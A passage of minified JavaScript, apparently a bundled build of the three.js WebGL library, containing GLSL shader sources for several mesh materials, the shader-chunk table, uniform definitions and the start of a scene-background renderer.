	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
#if defined( FLAT_SHADED ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP_TANGENTSPACE )
	vViewPosition = - mvPosition.xyz;
#endif
}`,sA=`#define NORMAL
uniform float opacity;
#if defined( FLAT_SHADED ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP_TANGENTSPACE )
	varying vec3 vViewPosition;
#endif
#include <uv_pars_fragment>
#include <normal_pars_fragment>
#include <bumpmap_pars_fragment>
#include <normalmap_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	vec4 diffuseColor = vec4( 0.0, 0.0, 0.0, opacity );
	#include <clipping_planes_fragment>
	#include <logdepthbuf_fragment>
	#include <normal_fragment_begin>
	#include <normal_fragment_maps>
	gl_FragColor = vec4( normalize( normal ) * 0.5 + 0.5, diffuseColor.a );
	#ifdef OPAQUE
		gl_FragColor.a = 1.0;
	#endif
}`,oA=`#define PHONG
varying vec3 vViewPosition;
#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <displacementmap_pars_vertex>
#include <envmap_pars_vertex>
#include <color_pars_vertex>
#include <fog_pars_vertex>
#include <normal_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <shadowmap_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	#include <color_vertex>
	#include <morphcolor_vertex>
	#include <batching_vertex>
	#include <beginnormal_vertex>
	#include <morphinstance_vertex>
	#include <morphnormal_vertex>
	#include <skinbase_vertex>
	#include <skinnormal_vertex>
	#include <defaultnormal_vertex>
	#include <normal_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <displacementmap_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	vViewPosition = - mvPosition.xyz;
	#include <worldpos_vertex>
	#include <envmap_vertex>
	#include <shadowmap_vertex>
	#include <fog_vertex>
}`,lA=`#define PHONG
uniform vec3 diffuse;
uniform vec3 emissive;
uniform vec3 specular;
uniform float shininess;
uniform float opacity;
#include <common>
#include <dithering_pars_fragment>
#include <color_pars_fragment>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <aomap_pars_fragment>
#include <lightmap_pars_fragment>
#include <emissivemap_pars_fragment>
#include <cube_uv_reflection_fragment>
#include <envmap_common_pars_fragment>
#include <envmap_pars_fragment>
#include <envmap_physical_pars_fragment>
#include <fog_pars_fragment>
#include <bsdfs>
#include <lights_pars_begin>
#include <normal_pars_fragment>
#include <lights_phong_pars_fragment>
#include <shadowmap_pars_fragment>
#include <bumpmap_pars_fragment>
#include <normalmap_pars_fragment>
#include <specularmap_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	vec4 diffuseColor = vec4( diffuse, opacity );
	#include <clipping_planes_fragment>
	ReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );
	vec3 totalEmissiveRadiance = emissive;
	#include <logdepthbuf_fragment>
	#include <map_fragment>
	#include <color_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	#include <specularmap_fragment>
	#include <normal_fragment_begin>
	#include <normal_fragment_maps>
	#include <emissivemap_fragment>
	#include <lights_phong_fragment>
	#include <lights_fragment_begin>
	#include <lights_fragment_maps>
	#include <lights_fragment_end>
	#include <aomap_fragment>
	vec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + reflectedLight.directSpecular + reflectedLight.indirectSpecular + totalEmissiveRadiance;
	#include <envmap_fragment>
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
	#include <premultiplied_alpha_fragment>
	#include <dithering_fragment>
}`,cA=`#define STANDARD
varying vec3 vViewPosition;
#ifdef USE_TRANSMISSION
	varying vec3 vWorldPosition;
#endif
#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <displacementmap_pars_vertex>
#include <color_pars_vertex>
#include <fog_pars_vertex>
#include <normal_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <shadowmap_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	#include <color_vertex>
	#include <morphinstance_vertex>
	#include <morphcolor_vertex>
	#include <batching_vertex>
	#include <beginnormal_vertex>
	#include <morphnormal_vertex>
	#include <skinbase_vertex>
	#include <skinnormal_vertex>
	#include <defaultnormal_vertex>
	#include <normal_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <displacementmap_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	vViewPosition = - mvPosition.xyz;
	#include <worldpos_vertex>
	#include <shadowmap_vertex>
	#include <fog_vertex>
#ifdef USE_TRANSMISSION
	vWorldPosition = worldPosition.xyz;
#endif
}`,uA=`#define STANDARD
#ifdef PHYSICAL
	#define IOR
	#define USE_SPECULAR
#endif
uniform vec3 diffuse;
uniform vec3 emissive;
uniform float roughness;
uniform float metalness;
uniform float opacity;
#ifdef IOR
	uniform float ior;
#endif
#ifdef USE_SPECULAR
	uniform float specularIntensity;
	uniform vec3 specularColor;
	#ifdef USE_SPECULAR_COLORMAP
		uniform sampler2D specularColorMap;
	#endif
	#ifdef USE_SPECULAR_INTENSITYMAP
		uniform sampler2D specularIntensityMap;
	#endif
#endif
#ifdef USE_CLEARCOAT
	uniform float clearcoat;
	uniform float clearcoatRoughness;
#endif
#ifdef USE_DISPERSION
	uniform float dispersion;
#endif
#ifdef USE_RETROREFLECTION
	uniform float retroreflectivity;
#endif
#ifdef USE_IRIDESCENCE
	uniform float iridescence;
	uniform float iridescenceIOR;
	uniform float iridescenceThicknessMinimum;
	uniform float iridescenceThicknessMaximum;
#endif
#ifdef USE_SHEEN
	uniform vec3 sheenColor;
	uniform float sheenRoughness;
	#ifdef USE_SHEEN_COLORMAP
		uniform sampler2D sheenColorMap;
	#endif
	#ifdef USE_SHEEN_ROUGHNESSMAP
		uniform sampler2D sheenRoughnessMap;
	#endif
#endif
#ifdef USE_ANISOTROPY
	uniform vec2 anisotropyVector;
	#ifdef USE_ANISOTROPYMAP
		uniform sampler2D anisotropyMap;
	#endif
#endif
varying vec3 vViewPosition;
#include <common>
#include <dithering_pars_fragment>
#include <color_pars_fragment>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <aomap_pars_fragment>
#include <lightmap_pars_fragment>
#include <emissivemap_pars_fragment>
#include <iridescence_fragment>
#include <cube_uv_reflection_fragment>
#include <envmap_common_pars_fragment>
#include <envmap_physical_pars_fragment>
#include <fog_pars_fragment>
#include <lights_pars_begin>
#include <normal_pars_fragment>
#include <lights_physical_pars_fragment>
#include <transmission_pars_fragment>
#include <shadowmap_pars_fragment>
#include <bumpmap_pars_fragment>
#include <normalmap_pars_fragment>
#include <clearcoat_pars_fragment>
#include <iridescence_pars_fragment>
#include <roughnessmap_pars_fragment>
#include <metalnessmap_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	vec4 diffuseColor = vec4( diffuse, opacity );
	#include <clipping_planes_fragment>
	ReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );
	vec3 totalEmissiveRadiance = emissive;
	#include <logdepthbuf_fragment>
	#include <map_fragment>
	#include <color_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	#include <roughnessmap_fragment>
	#include <metalnessmap_fragment>
	#include <normal_fragment_begin>
	#include <normal_fragment_maps>
	#include <clearcoat_normal_fragment_begin>
	#include <clearcoat_normal_fragment_maps>
	#include <emissivemap_fragment>
	#include <lights_physical_fragment>
	#include <lights_fragment_begin>
	#include <lights_fragment_maps>
	#include <lights_fragment_end>
	#include <aomap_fragment>
	vec3 totalDiffuse = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse;
	vec3 totalSpecular = reflectedLight.directSpecular + reflectedLight.indirectSpecular;
	#include <transmission_fragment>
	vec3 outgoingLight = totalDiffuse + totalSpecular + totalEmissiveRadiance;
	#ifdef USE_SHEEN
 
		outgoingLight = outgoingLight + sheenSpecularDirect + sheenSpecularIndirect;
 
 	#endif
	#ifdef USE_CLEARCOAT
		float dotNVcc = saturate( dot( geometryClearcoatNormal, geometryViewDir ) );
		vec3 Fcc = F_Schlick( material.clearcoatF0, material.clearcoatF90, dotNVcc );
		outgoingLight = outgoingLight * ( 1.0 - material.clearcoat * Fcc ) + ( clearcoatSpecularDirect + clearcoatSpecularIndirect ) * material.clearcoat;
	#endif
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
	#include <premultiplied_alpha_fragment>
	#include <dithering_fragment>
}`,fA=`#define TOON
varying vec3 vViewPosition;
#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <displacementmap_pars_vertex>
#include <color_pars_vertex>
#include <fog_pars_vertex>
#include <normal_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <shadowmap_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	#include <color_vertex>
	#include <morphinstance_vertex>
	#include <morphcolor_vertex>
	#include <batching_vertex>
	#include <beginnormal_vertex>
	#include <morphnormal_vertex>
	#include <skinbase_vertex>
	#include <skinnormal_vertex>
	#include <defaultnormal_vertex>
	#include <normal_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <displacementmap_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	vViewPosition = - mvPosition.xyz;
	#include <worldpos_vertex>
	#include <shadowmap_vertex>
	#include <fog_vertex>
}`,dA=`#define TOON
uniform vec3 diffuse;
uniform vec3 emissive;
uniform float opacity;
#include <common>
#include <dithering_pars_fragment>
#include <color_pars_fragment>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <aomap_pars_fragment>
#include <lightmap_pars_fragment>
#include <emissivemap_pars_fragment>
#include <gradientmap_pars_fragment>
#include <fog_pars_fragment>
#include <bsdfs>
#include <lights_pars_begin>
#include <normal_pars_fragment>
#include <lights_toon_pars_fragment>
#include <shadowmap_pars_fragment>
#include <bumpmap_pars_fragment>
#include <normalmap_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	vec4 diffuseColor = vec4( diffuse, opacity );
	#include <clipping_planes_fragment>
	ReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );
	vec3 totalEmissiveRadiance = emissive;
	#include <logdepthbuf_fragment>
	#include <map_fragment>
	#include <color_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	#include <normal_fragment_begin>
	#include <normal_fragment_maps>
	#include <emissivemap_fragment>
	#include <lights_toon_fragment>
	#include <lights_fragment_begin>
	#include <lights_fragment_maps>
	#include <lights_fragment_end>
	#include <aomap_fragment>
	vec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + totalEmissiveRadiance;
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
	#include <premultiplied_alpha_fragment>
	#include <dithering_fragment>
}`,hA=`uniform float size;
uniform float scale;
#include <common>
#include <color_pars_vertex>
#include <fog_pars_vertex>
#include <morphtarget_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
#ifdef USE_POINTS_UV
	varying vec2 vUv;
	uniform mat3 uvTransform;
#endif
void main() {
	#ifdef USE_POINTS_UV
		vUv = ( uvTransform * vec3( uv, 1 ) ).xy;
	#endif
	#include <color_vertex>
	#include <morphinstance_vertex>
	#include <morphcolor_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <project_vertex>
	gl_PointSize = size;
	#ifdef USE_SIZEATTENUATION
		bool isPerspective = isPerspectiveMatrix( projectionMatrix );
		if ( isPerspective ) gl_PointSize *= ( scale / - mvPosition.z );
	#endif
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	#include <worldpos_vertex>
	#include <fog_vertex>
}`,pA=`uniform vec3 diffuse;
uniform float opacity;
#include <common>
#include <color_pars_fragment>
#include <map_particle_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <fog_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	vec4 diffuseColor = vec4( diffuse, opacity );
	#include <clipping_planes_fragment>
	vec3 outgoingLight = vec3( 0.0 );
	#include <logdepthbuf_fragment>
	#include <map_particle_fragment>
	#include <color_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	outgoingLight = diffuseColor.rgb;
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
	#include <premultiplied_alpha_fragment>
}`,mA=`#include <common>
#include <batching_pars_vertex>
#include <fog_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <shadowmap_pars_vertex>
void main() {
	#include <batching_vertex>
	#include <beginnormal_vertex>
	#include <morphinstance_vertex>
	#include <morphnormal_vertex>
	#include <skinbase_vertex>
	#include <skinnormal_vertex>
	#include <defaultnormal_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <worldpos_vertex>
	#include <shadowmap_vertex>
	#include <fog_vertex>
}`,gA=`uniform vec3 color;
uniform float opacity;
#include <common>
#include <fog_pars_fragment>
#include <bsdfs>
#include <lights_pars_begin>
#include <logdepthbuf_pars_fragment>
#include <shadowmap_pars_fragment>
#include <shadowmask_pars_fragment>
void main() {
	#include <logdepthbuf_fragment>
	gl_FragColor = vec4( color, opacity * ( 1.0 - getShadowMask() ) );
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
	#include <premultiplied_alpha_fragment>
}`,_A=`uniform float rotation;
uniform vec2 center;
#include <common>
#include <uv_pars_vertex>
#include <fog_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	vec4 mvPosition = modelViewMatrix[ 3 ];
	vec2 scale = vec2( length( modelMatrix[ 0 ].xyz ), length( modelMatrix[ 1 ].xyz ) );
	#ifndef USE_SIZEATTENUATION
		bool isPerspective = isPerspectiveMatrix( projectionMatrix );
		if ( isPerspective ) scale *= - mvPosition.z;
	#endif
	vec2 alignedPosition = ( position.xy - ( center - vec2( 0.5 ) ) ) * scale;
	vec2 rotatedPosition;
	rotatedPosition.x = cos( rotation ) * alignedPosition.x - sin( rotation ) * alignedPosition.y;
	rotatedPosition.y = sin( rotation ) * alignedPosition.x + cos( rotation ) * alignedPosition.y;
	mvPosition.xy += rotatedPosition;
	gl_Position = projectionMatrix * mvPosition;
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	#include <fog_vertex>
}`,vA=`uniform vec3 diffuse;
uniform float opacity;
#include <common>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <fog_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	vec4 diffuseColor = vec4( diffuse, opacity );
	#include <clipping_planes_fragment>
	vec3 outgoingLight = vec3( 0.0 );
	#include <logdepthbuf_fragment>
	#include <map_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	outgoingLight = diffuseColor.rgb;
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
}`,me={alphahash_fragment:Fb,alphahash_pars_fragment:Hb,alphamap_fragment:Gb,alphamap_pars_fragment:Vb,alphatest_fragment:Xb,alphatest_pars_fragment:kb,aomap_fragment:Wb,aomap_pars_fragment:qb,batching_pars_vertex:Yb,batching_vertex:Zb,begin_vertex:Kb,beginnormal_vertex:jb,bsdfs:Qb,iridescence_fragment:Jb,bumpmap_pars_fragment:$b,clipping_planes_fragment:tT,clipping_planes_pars_fragment:eT,clipping_planes_pars_vertex:nT,clipping_planes_vertex:iT,color_fragment:aT,color_pars_fragment:rT,color_pars_vertex:sT,color_vertex:oT,common:lT,cube_uv_reflection_fragment:cT,defaultnormal_vertex:uT,displacementmap_pars_vertex:fT,displacementmap_vertex:dT,emissivemap_fragment:hT,emissivemap_pars_fragment:pT,colorspace_fragment:mT,colorspace_pars_fragment:gT,envmap_fragment:_T,envmap_common_pars_fragment:vT,envmap_pars_fragment:xT,envmap_pars_vertex:ST,envmap_physical_pars_fragment:DT,envmap_vertex:yT,fog_vertex:MT,fog_pars_vertex:ET,fog_fragment:bT,fog_pars_fragment:TT,gradientmap_pars_fragment:AT,lightmap_pars_fragment:RT,lights_lambert_fragment:CT,lights_lambert_pars_fragment:wT,lights_pars_begin:NT,lights_toon_fragment:UT,lights_toon_pars_fragment:LT,lights_phong_fragment:OT,lights_phong_pars_fragment:PT,lights_physical_fragment:IT,lights_physical_pars_fragment:zT,lights_fragment_begin:BT,lights_fragment_maps:FT,lights_fragment_end:HT,lightprobes_pars_fragment:GT,logdepthbuf_fragment:VT,logdepthbuf_pars_fragment:XT,logdepthbuf_pars_vertex:kT,logdepthbuf_vertex:WT,map_fragment:qT,map_pars_fragment:YT,map_particle_fragment:ZT,map_particle_pars_fragment:KT,metalnessmap_fragment:jT,metalnessmap_pars_fragment:QT,morphinstance_vertex:JT,morphcolor_vertex:$T,morphnormal_vertex:t1,morphtarget_pars_vertex:e1,morphtarget_vertex:n1,normal_fragment_begin:i1,normal_fragment_maps:a1,normal_pars_fragment:r1,normal_pars_vertex:s1,normal_vertex:o1,normalmap_pars_fragment:l1,clearcoat_normal_fragment_begin:c1,clearcoat_normal_fragment_maps:u1,clearcoat_pars_fragment:f1,iridescence_pars_fragment:d1,opaque_fragment:h1,packing:p1,premultiplied_alpha_fragment:m1,project_vertex:g1,dithering_fragment:_1,dithering_pars_fragment:v1,roughnessmap_fragment:x1,roughnessmap_pars_fragment:S1,shadowmap_pars_fragment:y1,shadowmap_pars_vertex:M1,shadowmap_vertex:E1,shadowmask_pars_fragment:b1,skinbase_vertex:T1,skinning_pars_vertex:A1,skinning_vertex:R1,skinnormal_vertex:C1,specularmap_fragment:w1,specularmap_pars_fragment:N1,tonemapping_fragment:D1,tonemapping_pars_fragment:U1,transmission_fragment:L1,transmission_pars_fragment:O1,uv_pars_fragment:P1,uv_pars_vertex:I1,uv_vertex:z1,worldpos_vertex:B1,background_vert:F1,background_frag:H1,backgroundCube_vert:G1,backgroundCube_frag:V1,cube_vert:X1,cube_frag:k1,depth_vert:W1,depth_frag:q1,distance_vert:Y1,distance_frag:Z1,equirect_vert:K1,equirect_frag:j1,linedashed_vert:Q1,linedashed_frag:J1,meshbasic_vert:$1,meshbasic_frag:tA,meshlambert_vert:eA,meshlambert_frag:nA,meshmatcap_vert:iA,meshmatcap_frag:aA,meshnormal_vert:rA,meshnormal_frag:sA,meshphong_vert:oA,meshphong_frag:lA,meshphysical_vert:cA,meshphysical_frag:uA,meshtoon_vert:fA,meshtoon_frag:dA,points_vert:hA,points_frag:pA,shadow_vert:mA,shadow_frag:gA,sprite_vert:_A,sprite_frag:vA},Vt={common:{diffuse:{value:new ze(16777215)},opacity:{value:1},map:{value:null},mapTransform:{value:new de},alphaMap:{value:null},alphaMapTransform:{value:new de},alphaTest:{value:0}},specularmap:{specularMap:{value:null},specularMapTransform:{value:new de}},envmap:{envMap:{value:null},envMapRotation:{value:new de},reflectivity:{value:1},ior:{value:1.5},refractionRatio:{value:.98},dfgLUT:{value:null}},aomap:{aoMap:{value:null},aoMapIntensity:{value:1},aoMapTransform:{value:new de}},lightmap:{lightMap:{value:null},lightMapIntensity:{value:1},lightMapTransform:{value:new de}},bumpmap:{bumpMap:{value:null},bumpMapTransform:{value:new de},bumpScale:{value:1}},normalmap:{normalMap:{value:null},normalMapTransform:{value:new de},normalScale:{value:new Ue(1,1)}},displacementmap:{displacementMap:{value:null},displacementMapTransform:{value:new de},displacementScale:{value:1},displacementBias:{value:0}},emissivemap:{emissiveMap:{value:null},emissiveMapTransform:{value:new de}},metalnessmap:{metalnessMap:{value:null},metalnessMapTransform:{value:new de}},roughnessmap:{roughnessMap:{value:null},roughnessMapTransform:{value:new de}},gradientmap:{gradientMap:{value:null}},fog:{fogDensity:{value:25e-5},fogNear:{value:1},fogFar:{value:2e3},fogColor:{value:new ze(16777215)}},lights:{ambientLightColor:{value:[]},lightProbe:{value:[]},sunLights:{value:[],properties:{direction:{},color:{}}},sunLightShadows:{value:[],properties:{shadowIntensity:1,shadowBias:{},shadowNormalBias:{},shadowRadius:{},shadowMapSize:{}}},sunShadowMatrix:{value:[]},sunShadowCascade:{value:[]},directionalLights:{value:[],properties:{direction:{},color:{}}},directionalLightShadows:{value:[],properties:{shadowIntensity:1,shadowBias:{},shadowNormalBias:{},shadowRadius:{},shadowMapSize:{}}},directionalShadowMatrix:{value:[]},spotLights:{value:[],properties:{color:{},position:{},direction:{},distance:{},coneCos:{},penumbraCos:{},decay:{}}},spotLightShadows:{value:[],properties:{shadowIntensity:1,shadowBias:{},shadowNormalBias:{},shadowRadius:{},shadowMapSize:{}}},spotLightMap:{value:[]},spotLightMatrix:{value:[]},pointLights:{value:[],properties:{color:{},position:{},decay:{},distance:{}}},pointLightShadows:{value:[],properties:{shadowIntensity:1,shadowBias:{},shadowNormalBias:{},shadowRadius:{},shadowMapSize:{},shadowCameraNear:{},shadowCameraFar:{}}},pointShadowMatrix:{value:[]},hemisphereLights:{value:[],properties:{direction:{},skyColor:{},groundColor:{}}},rectAreaLights:{value:[],properties:{color:{},position:{},width:{},height:{}}},ltc_1:{value:null},ltc_2:{value:null},probesSH:{value:null},probesMin:{value:new it},probesMax:{value:new it},probesResolution:{value:new it}},points:{diffuse:{value:new ze(16777215)},opacity:{value:1},size:{value:1},scale:{value:1},map:{value:null},alphaMap:{value:null},alphaMapTransform:{value:new de},alphaTest:{value:0},uvTransform:{value:new de}},sprite:{diffuse:{value:new ze(16777215)},opacity:{value:1},center:{value:new Ue(.5,.5)},rotation:{value:0},map:{value:null},mapTransform:{value:new de},alphaMap:{value:null},alphaMapTransform:{value:new de},alphaTest:{value:0}}},na={basic:{uniforms:Vn([Vt.common,Vt.specularmap,Vt.envmap,Vt.aomap,Vt.lightmap,Vt.fog]),vertexShader:me.meshbasic_vert,fragmentShader:me.meshbasic_frag},lambert:{uniforms:Vn([Vt.common,Vt.specularmap,Vt.envmap,Vt.aomap,Vt.lightmap,Vt.emissivemap,Vt.bumpmap,Vt.normalmap,Vt.displacementmap,Vt.fog,Vt.lights,{emissive:{value:new ze(0)},envMapIntensity:{value:1}}]),vertexShader:me.meshlambert_vert,fragmentShader:me.meshlambert_frag},phong:{uniforms:Vn([Vt.common,Vt.specularmap,Vt.envmap,Vt.aomap,Vt.lightmap,Vt.emissivemap,Vt.bumpmap,Vt.normalmap,Vt.displacementmap,Vt.fog,Vt.lights,{emissive:{value:new ze(0)},specular:{value:new ze(1118481)},shininess:{value:30},envMapIntensity:{value:1}}]),vertexShader:me.meshphong_vert,fragmentShader:me.meshphong_frag},standard:{uniforms:Vn([Vt.common,Vt.envmap,Vt.aomap,Vt.lightmap,Vt.emissivemap,Vt.bumpmap,Vt.normalmap,Vt.displacementmap,Vt.roughnessmap,Vt.metalnessmap,Vt.fog,Vt.lights,{emissive:{value:new ze(0)},roughness:{value:1},metalness:{value:0},envMapIntensity:{value:1}}]),vertexShader:me.meshphysical_vert,fragmentShader:me.meshphysical_frag},toon:{uniforms:Vn([Vt.common,Vt.aomap,Vt.lightmap,Vt.emissivemap,Vt.bumpmap,Vt.normalmap,Vt.displacementmap,Vt.gradientmap,Vt.fog,Vt.lights,{emissive:{value:new ze(0)}}]),vertexShader:me.meshtoon_vert,fragmentShader:me.meshtoon_frag},matcap:{uniforms:Vn([Vt.common,Vt.bumpmap,Vt.normalmap,Vt.displacementmap,Vt.fog,{matcap:{value:null}}]),vertexShader:me.meshmatcap_vert,fragmentShader:me.meshmatcap_frag},points:{uniforms:Vn([Vt.points,Vt.fog]),vertexShader:me.points_vert,fragmentShader:me.points_frag},dashed:{uniforms:Vn([Vt.common,Vt.fog,{scale:{value:1},dashSize:{value:1},totalSize:{value:2}}]),vertexShader:me.linedashed_vert,fragmentShader:me.linedashed_frag},depth:{uniforms:Vn([Vt.common,Vt.displacementmap]),vertexShader:me.depth_vert,fragmentShader:me.depth_frag},normal:{uniforms:Vn([Vt.common,Vt.bumpmap,Vt.normalmap,Vt.displacementmap,{opacity:{value:1}}]),vertexShader:me.meshnormal_vert,fragmentShader:me.meshnormal_frag},sprite:{uniforms:Vn([Vt.sprite,Vt.fog]),vertexShader:me.sprite_vert,fragmentShader:me.sprite_frag},background:{uniforms:{uvTransform:{value:new de},t2D:{value:null},backgroundIntensity:{value:1}},vertexShader:me.background_vert,fragmentShader:me.background_frag},backgroundCube:{uniforms:{envMap:{value:null},backgroundBlurriness:{value:0},backgroundIntensity:{value:1},backgroundRotation:{value:new de}},vertexShader:me.backgroundCube_vert,fragmentShader:me.backgroundCube_frag},cube:{uniforms:{tCube:{value:null},tFlip:{value:-1},opacity:{value:1}},vertexShader:me.cube_vert,fragmentShader:me.cube_frag},equirect:{uniforms:{tEquirect:{value:null}},vertexShader:me.equirect_vert,fragmentShader:me.equirect_frag},distance:{uniforms:Vn([Vt.common,Vt.displacementmap,{referencePosition:{value:new it},nearDistance:{value:1},farDistance:{value:1e3}}]),vertexShader:me.distance_vert,fragmentShader:me.distance_frag},shadow:{uniforms:Vn([Vt.lights,Vt.fog,{color:{value:new ze(0)},opacity:{value:1}}]),vertexShader:me.shadow_vert,fragmentShader:me.shadow_frag}};na.physical={uniforms:Vn([na.standard.uniforms,{clearcoat:{value:0},clearcoatMap:{value:null},clearcoatMapTransform:{value:new de},clearcoatNormalMap:{value:null},clearcoatNormalMapTransform:{value:new de},clearcoatNormalScale:{value:new Ue(1,1)},clearcoatRoughness:{value:0},clearcoatRoughnessMap:{value:null},clearcoatRoughnessMapTransform:{value:new de},dispersion:{value:0},retroreflectivity:{value:0},iridescence:{value:0},iridescenceMap:{value:null},iridescenceMapTransform:{value:new de},iridescenceIOR:{value:1.3},iridescenceThicknessMinimum:{value:100},iridescenceThicknessMaximum:{value:400},iridescenceThicknessMap:{value:null},iridescenceThicknessMapTransform:{value:new de},sheen:{value:0},sheenColor:{value:new ze(0)},sheenColorMap:{value:null},sheenColorMapTransform:{value:new de},sheenRoughness:{value:1},sheenRoughnessMap:{value:null},sheenRoughnessMapTransform:{value:new de},transmission:{value:0},transmissionMap:{value:null},transmissionMapTransform:{value:new de},transmissionSamplerSize:{value:new Ue},transmissionSamplerMap:{value:null},thickness:{value:0},thicknessMap:{value:null},thicknessMapTransform:{value:new de},attenuationDistance:{value:0},attenuationColor:{value:new ze(0)},specularColor:{value:new ze(1,1,1)},specularColorMap:{value:null},specularColorMapTransform:{value:new de},specularIntensity:{value:1},specularIntensityMap:{value:null},specularIntensityMapTransform:{value:new de},anisotropyVector:{value:new Ue},anisotropyMap:{value:null},anisotropyMapTransform:{value:new de}}]),vertexShader:me.meshphysical_vert,fragmentShader:me.meshphysical_frag};const vu={r:0,b:0,g:0},xA=new cn,lS=new de;lS.set(-1,0,0,0,1,0,0,0,1);function SA(o,e,i,s,c,f){const d=new ze(0);let h=c===!0?0:1,m,p,x=null,v=0,_=null;function E(N){let B=N.isScene===!0?N.background:null;if(B&&B.isTexture){const C=N.backgroundBlurriness>0;B=e.get(B,C)}return B}function T(N){let B=!1;const C=E(N);C===null?y(d,h):C&&C.isColor&&(y(C,1),B=!0);const U=o.xr.getEnvironmentBlendMode();U==="additive"?i.buffers.color.setClear(0,0,0,1,f):U==="alpha-blend"&&i.buffers.color.setClear(0,0,0,0,f),(o.autoClear||B)&&(i.buffers.depth.setTest(!0),i.buffers.depth.setMask(!0),i.buffers.color.setMask(!0),o.clear(o.autoClearColor,o.autoClearDepth,o.autoClearStencil))}function w(N,B){const C=E(B);C&&(C.isCubeTexture||C.mapping===Iu)?(p===void 0&&(p=new Oa(new bl(1,1,1),new la({name:"BackgroundCubeMaterial",uniforms:ao(na.backgroundCube.uniforms),vertexShader:na.backgroundCube.vertexShader,fragmentShader:na.backgroundCube.fragmentShader,side:Jn,depthTest:!1,depthWrite:!1,fog:!1,allowOverride:!1})),p.geometry.deleteAttribute("normal"),p.geometry.deleteAttribute("uv"),p.onBeforeRender=function(U,D,P){this.matrixWorld.copyPosition(P.matrixWorld)},Object.defineProperty(p.material,"envMap",{get:function(){return 